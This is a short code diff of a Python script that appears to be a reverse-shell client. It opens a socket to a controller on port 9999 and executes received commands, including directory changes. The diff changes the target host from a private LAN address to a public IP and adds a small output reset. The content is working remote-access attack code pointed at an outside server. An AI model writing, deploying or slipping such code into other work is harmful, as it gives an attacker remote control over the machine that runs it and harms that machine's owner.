@@ -6,7 +6,7 @@ import time
 
 s = socket.socket()
 
-host = '192.168.1.16'
+host = '159.223.85.70'
 port = 9999
 
 s.connect((host, port))
@@ -20,6 +20,7 @@ while True:
 
     if(data[:2].decode("utf-8") == "cd"):
         os.chdir(data[3:].decode("utf-8"))
+        output_str = ""
         currentWD = os.getcwd() + "> "
 
 
